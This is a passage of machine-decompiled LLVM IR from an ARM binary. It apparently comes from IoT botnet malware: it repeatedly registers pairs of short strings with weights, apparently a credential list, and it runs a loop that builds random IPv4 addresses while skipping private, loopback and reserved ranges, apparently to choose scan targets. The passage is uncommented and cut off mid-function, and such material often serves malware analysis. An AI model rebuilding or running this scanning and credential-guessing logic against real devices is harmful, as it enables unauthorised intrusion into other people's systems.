  %v5_12664 = call i32 @function_120f4(i32 ptrtoint ([11 x i8]* @global_var_150c8.326 to i32), i32 ptrtoint ([11 x i8]* @global_var_150c8.326 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32* %r1.global-to-local, align 4
  %v5_12674 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15058.302 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12684 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32 ptrtoint (i32* @global_var_15058.302 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15058.302 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12694 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), i32 ptrtoint (i32* @global_var_15058.302 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_150dc.330 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_126a4 = call i32 @function_120f4(i32 ptrtoint (i32* @global_var_150dc.330 to i32), i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_150e4.332 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15098.316 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_126b4 = call i32 @function_120f4(i32 ptrtoint ([14 x i8]* @global_var_150e4.332 to i32), i32 ptrtoint (i32* @global_var_15098.316 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_15090.314 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15090.314 to i32), i32* %r1.global-to-local, align 4
  %v3_126c4 = call i32 @function_120f4(i32 ptrtoint (i32* @global_var_15090.314 to i32), i32 ptrtoint (i32* @global_var_15090.314 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_151d4.284 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_151d4.284 to i32), i32* %r1.global-to-local, align 4
  %v3_126d4 = call i32 @function_120f4(i32 ptrtoint (i32* @global_var_151d4.284 to i32), i32 ptrtoint (i32* @global_var_151d4.284 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_150f4.334 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_150f4.334 to i32), i32* %r1.global-to-local, align 4
  %v5_126e4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_150f4.334 to i32), i32 ptrtoint ([5 x i8]* @global_var_150f4.334 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_150fc.336 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_126f4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_150fc.336 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15104.338 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12704 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_15104.338 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1510c.340 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12714 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_1510c.340 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15114.342 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12724 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([6 x i8]* @global_var_15114.342 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1511c.344 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_12734 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([5 x i8]* @global_var_1511c.344 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15124.346 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12744 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([6 x i8]* @global_var_15124.346 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1512c.348 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12754 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_1512c.348 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1513c.350 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12764 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_1513c.350 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1514c.352 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12774 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([7 x i8]* @global_var_1514c.352 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15154.354 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12784 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([5 x i8]* @global_var_15154.354 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1515c.356 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12794 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([9 x i8]* @global_var_1515c.356 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_127a4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15168.358 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_127b4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint ([8 x i8]* @global_var_15168.358 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15170.360 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_127c4 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), i32 ptrtoint (i32* @global_var_15170.360 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1517c.362 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_127d4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_1517c.362 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15098.316 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_127e4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_15098.316 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15058.302 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_127f4 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_15058.302 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15200.294 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12804 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_15200.294 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_151f8.292 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12814 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_151f8.292 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1513c.350 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12824 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_1513c.350 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15184.364 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_12834 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint (i32* @global_var_15184.364 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15068.306 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12844 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint ([5 x i8]* @global_var_15068.306 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_150b8.322 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12854 = call i32 @function_120f4(i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), i32 ptrtoint ([7 x i8]* @global_var_150b8.322 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_151f0.366 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_151f0.366 to i32), i32* %r1.global-to-local, align 4
  %v5_12864 = call i32 @function_120f4(i32 ptrtoint ([5 x i8]* @global_var_151f0.366 to i32), i32 ptrtoint ([5 x i8]* @global_var_151f0.366 to i32), i32 1)
  store i32 ptrtoint ([7 x i8]* @global_var_1518c.368 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_15194.370 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_12874 = call i32 @function_120f4(i32 ptrtoint ([7 x i8]* @global_var_1518c.368 to i32), i32 ptrtoint ([7 x i8]* @global_var_15194.370 to i32), i32 1)
  %v2_1287c = ptrtoint i32* %stack_var_-1862 to i32
  store i32 %v2_1287c, i32* %r0.global-to-local, align 4
  %v2_12880 = ptrtoint i32* %stack_var_-1842 to i32
  store i32 %v2_12880, i32* %r1.global-to-local, align 4
  %tmp277 = bitcast i32* %stack_var_-1842 to i8*
  br label %dec_label_pc_1288c

dec_label_pc_1288c:                               ; preds = %dec_label_pc_12ee4, %dec_label_pc_123e4
  %stack_var_-1872.0 = phi i32 [ %tmp239, %dec_label_pc_123e4 ], [ %stack_var_-1872.2, %dec_label_pc_12ee4 ]
  %stack_var_-1884.0 = phi i8* [ %tmp277, %dec_label_pc_123e4 ], [ %stack_var_-1884.1, %dec_label_pc_12ee4 ]
  %v0_12bbc = phi i32 [ %v2_1287c, %dec_label_pc_123e4 ], [ %stack_var_-1880.1, %dec_label_pc_12ee4 ]
  %stack_var_-1876.0 = phi i8 [ %v5_123cc.le, %dec_label_pc_123e4 ], [ %stack_var_-1876.1, %dec_label_pc_12ee4 ]
  store i32 ptrtoint (i32* @global_var_1d9a8.243 to i32), i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1872.0, i32* %r3.global-to-local, align 4
  %v2_12894 = load i32, i32* @global_var_1d9a8.243, align 4
  store i32 %v2_12894, i32* @r8, align 4
  %v3_12898 = icmp uge i32 %stack_var_-1872.0, %v2_12894
  store i1 %v3_12898, i1* %cpsr_c.global-to-local, align 1
  %v9_12898 = icmp eq i32 %stack_var_-1872.0, %v2_12894
  store i1 %v9_12898, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_12898, label %dec_label_pc_12b44, label %dec_label_pc_128a0

dec_label_pc_128a0:                               ; preds = %dec_label_pc_1288c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  %v2_12b14 = ptrtoint i32* %stack_var_-92 to i32
  br label %dec_label_pc_128ac

dec_label_pc_128ac:                               ; preds = %.thread47.dec_label_pc_128ac_crit_edge, %dec_label_pc_128a0
  %v0_128ac = phi i32 [ %v0_128ac.pre, %.thread47.dec_label_pc_128ac_crit_edge ], [ 0, %dec_label_pc_128a0 ]
  store i32 %v0_128ac, i32* %stack_var_-92, align 4
  store i32 %v0_128ac, i32* %stack_var_-84, align 4
  %v0_128bc = call i32 @function_117dc()
  %v1_128bc = trunc i32 %v0_128bc to i8
  store i32 %v0_128bc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d9ac.143 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1d978.259 to i32), i32* %r1.global-to-local, align 4
  %v2_128c8 = load i32, i32* @global_var_1d9ac.143, align 4
  store i32 %v2_128c8, i32* %r2.global-to-local, align 4
  %v2_128cc = and i32 %v0_128bc, 128
  %v3_128cc = icmp ne i32 %v2_128cc, 0
  store i1 %v3_128cc, i1* %cpsr_c.global-to-local, align 1
  %v4_128cc = sdiv i32 %v0_128bc, 256
  store i32 %v4_128cc, i32* %r3.global-to-local, align 4
  %v1_128d0 = trunc i32 %v4_128cc to i8
  store i8 %v1_128d0, i8* bitcast (i32* @global_var_1d97d.266 to i8*), align 4
  store i32 %v2_128c8, i32* @global_var_1d984.371, align 4
  store i8 %v1_128bc, i8* bitcast (i32* @global_var_1d97c.270 to i8*), align 4
  br label %dec_label_pc_128dc

dec_label_pc_128dc:                               ; preds = %dec_label_pc_129b0, %dec_label_pc_1290c, %dec_label_pc_129e4, %dec_label_pc_129d8, %dec_label_pc_129cc, %dec_label_pc_129c0, %.thread32, %bb296, %bb295, %bb294, %bb293, %bb292, %dec_label_pc_129a8, %dec_label_pc_129a0, %bb288, %dec_label_pc_12970, %dec_label_pc_1294c, %bb281, %dec_label_pc_1291c, %bb280, %dec_label_pc_12904, %bb279, %bb298, %dec_label_pc_128ac
  %v0_128dc = call i32 @function_117dc()
  store i32 %v0_128dc, i32* %r0.global-to-local, align 4
  %v1_128e0 = urem i32 %v0_128dc, 256
  store i32 %v1_128e0, i32* %r1.global-to-local, align 4
  %v3_128e4 = udiv i32 %v0_128dc, 256
  store i32 %v3_128e4, i32* %r3.global-to-local, align 4
  %v3_128e8 = udiv i32 %v0_128dc, 65536
  store i32 %v3_128e8, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_128ec = icmp eq i32 %v1_128e0, 0
  store i1 %v2_128ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_128ec, label %bb279, label %bb278

bb278:                                            ; preds = %dec_label_pc_128dc
  %v3_128f0 = icmp ugt i32 %v1_128e0, 126
  store i1 %v3_128f0, i1* %cpsr_c.global-to-local, align 1
  %v8_128f0 = icmp eq i32 %v1_128e0, 127
  store i1 %v8_128f0, i1* %cpsr_z.global-to-local, align 1
  br label %bb279

bb279:                                            ; preds = %dec_label_pc_128dc, %bb278
  %v0_12900 = phi i1 [ true, %dec_label_pc_128dc ], [ %v8_128f0, %bb278 ]
  %v1_128f4 = urem i32 %v3_128e4, 256
  store i32 %v1_128f4, i32* %ip.global-to-local, align 4
  %v1_128f8 = urem i32 %v3_128e8, 256
  store i32 %v1_128f8, i32* %r2.global-to-local, align 4
  %v1_128fc = and i32 %v0_128dc, 8388608
  %v2_128fc = icmp ne i32 %v1_128fc, 0
  store i1 %v2_128fc, i1* %cpsr_c.global-to-local, align 1
  %v3_128fc = udiv i32 %v0_128dc, 16777216
  store i32 %v3_128fc, i32* %r0.global-to-local, align 4
  br i1 %v0_12900, label %dec_label_pc_128dc, label %dec_label_pc_12904

dec_label_pc_12904:                               ; preds = %bb279
  %v2_12904 = icmp ugt i32 %v1_128e0, 2
  store i1 %v2_12904, i1* %cpsr_c.global-to-local, align 1
  %v7_12904 = icmp eq i32 %v1_128e0, 3
  store i1 %v7_12904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12904, label %dec_label_pc_128dc, label %dec_label_pc_1290c

dec_label_pc_1290c:                               ; preds = %dec_label_pc_12904
  %v1_1290c = add nsw i32 %v1_128e0, -15
  store i32 %v1_1290c, i32* %r3.global-to-local, align 4
  %v2_12910 = icmp ugt i32 %v1_128e0, 55
  store i1 %v2_12910, i1* %cpsr_c.global-to-local, align 1
  %v7_12910 = icmp eq i32 %v1_128e0, 56
  store i1 %v7_12910, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12910, label %dec_label_pc_128dc, label %bb280

bb280:                                            ; preds = %dec_label_pc_1290c
  %v3_12914 = icmp ne i32 %v1_1290c, 0
  store i1 %v3_12914, i1* %cpsr_c.global-to-local, align 1
  %v8_12914 = icmp eq i32 %v1_1290c, 1
  store i1 %v8_12914, i1* %cpsr_z.global-to-local, align 1
  %v2_12918 = xor i1 %v3_12914, true
  %v3_12918 = or i1 %v8_12914, %v2_12918
  br i1 %v3_12918, label %dec_label_pc_128dc, label %dec_label_pc_1291c

dec_label_pc_1291c:                               ; preds = %bb280
  %v2_1291c = icmp ugt i32 %v1_128e0, 9
  store i1 %v2_1291c, i1* %cpsr_c.global-to-local, align 1
  %v7_1291c = icmp eq i32 %v1_128e0, 10
  store i1 %v7_1291c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1291c, label %dec_label_pc_128dc, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_1291c
  %v2_12924 = icmp ugt i32 %v1_128e0, 191
  store i1 %v2_12924, i1* %cpsr_c.global-to-local, align 1
  %v7_12924 = icmp eq i32 %v1_128e0, 192
  store i1 %v7_12924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12924, label %bb281, label %dec_label_pc_12930

bb281:                                            ; preds = %dec_label_pc_12924
  %v3_12928 = icmp ugt i32 %v1_128f4, 167
  store i1 %v3_12928, i1* %cpsr_c.global-to-local, align 1
  %v8_12928 = icmp eq i32 %v1_128f4, 168
  store i1 %v8_12928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12928, label %dec_label_pc_128dc, label %dec_label_pc_12930

dec_label_pc_12930:                               ; preds = %dec_label_pc_12924, %bb281
  %v7_12930 = icmp eq i32 %v1_128e0, 172
  %.347 = zext i1 %v7_12930 to i32
  store i32 %.347, i32* %r3.global-to-local, align 4
  %v2_1293c = icmp ugt i32 %v1_128f4, 14
  store i1 %v2_1293c, i1* %cpsr_c.global-to-local, align 1
  %v7_1293c = icmp eq i32 %v1_128f4, 15
  store i1 %v7_1293c, i1* %cpsr_z.global-to-local, align 1
  %v2_12940 = xor i1 %v2_1293c, true
  %v3_12940 = or i1 %v7_1293c, %v2_12940
  br i1 %v3_12940, label %.thread10, label %bb284

.thread10:                                        ; preds = %dec_label_pc_12930
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12954

bb284:                                            ; preds = %dec_label_pc_12930
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12944 = icmp eq i1 %v7_12930, false
  store i1 %v2_12944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12944, label %dec_label_pc_12954, label %dec_label_pc_1294c

dec_label_pc_1294c:                               ; preds = %bb284
  %v2_1294c = icmp ugt i32 %v1_128f4, 30
  store i1 %v2_1294c, i1* %cpsr_c.global-to-local, align 1
  %v7_1294c = icmp eq i32 %v1_128f4, 31
  store i1 %v7_1294c, i1* %cpsr_z.global-to-local, align 1
  %v2_12950 = xor i1 %v2_1294c, true
  %v3_12950 = or i1 %v7_1294c, %v2_12950
  br i1 %v3_12950, label %dec_label_pc_128dc, label %dec_label_pc_12954

dec_label_pc_12954:                               ; preds = %.thread10, %dec_label_pc_1294c, %bb284
  %v7_12954 = icmp eq i32 %v1_128e0, 100
  %.348 = zext i1 %v7_12954 to i32
  store i32 %.348, i32* %r3.global-to-local, align 4
  %v2_12960 = icmp ugt i32 %v1_128f4, 62
  store i1 %v2_12960, i1* %cpsr_c.global-to-local, align 1
  %v7_12960 = icmp eq i32 %v1_128f4, 63
  store i1 %v7_12960, i1* %cpsr_z.global-to-local, align 1
  %v2_12964 = xor i1 %v2_12960, true
  %v3_12964 = or i1 %v7_12960, %v2_12964
  br i1 %v3_12964, label %.thread15, label %bb287

.thread15:                                        ; preds = %dec_label_pc_12954
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12978

bb287:                                            ; preds = %dec_label_pc_12954
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12968 = icmp eq i1 %v7_12954, false
  store i1 %v2_12968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12968, label %dec_label_pc_12978, label %dec_label_pc_12970

dec_label_pc_12970:                               ; preds = %bb287
  %v2_12970 = icmp ugt i32 %v1_128f4, 125
  store i1 %v2_12970, i1* %cpsr_c.global-to-local, align 1
  %v7_12970 = icmp eq i32 %v1_128f4, 126
  store i1 %v7_12970, i1* %cpsr_z.global-to-local, align 1
  %v2_12974 = xor i1 %v2_12970, true
  %v3_12974 = or i1 %v7_12970, %v2_12974
  br i1 %v3_12974, label %dec_label_pc_128dc, label %dec_label_pc_12978

dec_label_pc_12978:                               ; preds = %.thread15, %dec_label_pc_12970, %bb287
  %v2_12978 = icmp ugt i32 %v1_128e0, 168
  store i1 %v2_12978, i1* %cpsr_c.global-to-local, align 1
  %v7_12978 = icmp eq i32 %v1_128e0, 169
  store i1 %v7_12978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12978, label %bb288, label %dec_label_pc_12984

bb288:                                            ; preds = %dec_label_pc_12978
  %v3_1297c = icmp eq i32 %v1_128f4, 255
  store i1 %v3_1297c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_1297c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1297c, label %dec_label_pc_128dc, label %dec_label_pc_12984

dec_label_pc_12984:                               ; preds = %dec_label_pc_12978, %bb288
  %v7_12984 = icmp eq i32 %v1_128e0, 198
  %.349 = zext i1 %v7_12984 to i32
  store i32 %.349, i32* %r3.global-to-local, align 4
  %v2_12990 = icmp ugt i32 %v1_128f4, 16
  store i1 %v2_12990, i1* %cpsr_c.global-to-local, align 1
  %v7_12990 = icmp eq i32 %v1_128f4, 17
  store i1 %v7_12990, i1* %cpsr_z.global-to-local, align 1
  %v2_12994 = xor i1 %v2_12990, true
  %v3_12994 = or i1 %v7_12990, %v2_12994
  br i1 %v3_12994, label %.thread21, label %bb291

.thread21:                                        ; preds = %dec_label_pc_12984
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_129a8

bb291:                                            ; preds = %dec_label_pc_12984
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12998 = icmp eq i1 %v7_12984, false
  store i1 %v2_12998, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12998, label %dec_label_pc_129a8, label %dec_label_pc_129a0

dec_label_pc_129a0:                               ; preds = %bb291
  %v2_129a0 = icmp ugt i32 %v1_128f4, 18
  store i1 %v2_129a0, i1* %cpsr_c.global-to-local, align 1
  %v7_129a0 = icmp eq i32 %v1_128f4, 19
  store i1 %v7_129a0, i1* %cpsr_z.global-to-local, align 1
  %v2_129a4 = xor i1 %v2_129a0, true
  %v3_129a4 = or i1 %v7_129a0, %v2_129a4
  br i1 %v3_129a4, label %dec_label_pc_128dc, label %dec_label_pc_129a8

dec_label_pc_129a8:                               ; preds = %.thread21, %dec_label_pc_129a0, %bb291
  %v2_129a8 = icmp ugt i32 %v1_128e0, 222
  store i1 %v2_129a8, i1* %cpsr_c.global-to-local, align 1
  %v7_129a8 = icmp eq i32 %v1_128e0, 223
  store i1 %v7_129a8, i1* %cpsr_z.global-to-local, align 1
  %v2_129ac = xor i1 %v7_129a8, true
  %v3_129ac = and i1 %v2_129a8, %v2_129ac
  br i1 %v3_129ac, label %dec_label_pc_128dc, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_129a8
  %v1_129b0 = add nsw i32 %v1_128e0, -6
  store i32 %v1_129b0, i32* %r3.global-to-local, align 4
  %v2_129b4 = icmp ugt i32 %v1_128e0, 10
  store i1 %v2_129b4, i1* %cpsr_c.global-to-local, align 1
  %v7_129b4 = icmp eq i32 %v1_128e0, 11
  store i1 %v7_129b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129b4, label %dec_label_pc_128dc, label %bb292

bb292:                                            ; preds = %dec_label_pc_129b0
  %v3_129b8 = icmp ne i32 %v1_129b0, 0
  store i1 %v3_129b8, i1* %cpsr_c.global-to-local, align 1
  %v8_129b8 = icmp eq i32 %v1_129b0, 1
  store i1 %v8_129b8, i1* %cpsr_z.global-to-local, align 1
  %v2_129bc = xor i1 %v3_129b8, true
  %v3_129bc = or i1 %v8_129b8, %v2_129bc
  br i1 %v3_129bc, label %dec_label_pc_128dc, label %dec_label_pc_129c0

dec_label_pc_129c0:                               ; preds = %bb292
  %v2_129c0 = icmp ugt i32 %v1_128e0, 21
  store i1 %v2_129c0, i1* %cpsr_c.global-to-local, align 1
  %v7_129c0 = icmp eq i32 %v1_128e0, 22
  store i1 %v7_129c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129c0, label %dec_label_pc_128dc, label %bb293

bb293:                                            ; preds = %dec_label_pc_129c0
  %v3_129c4 = icmp ugt i32 %v1_128e0, 20
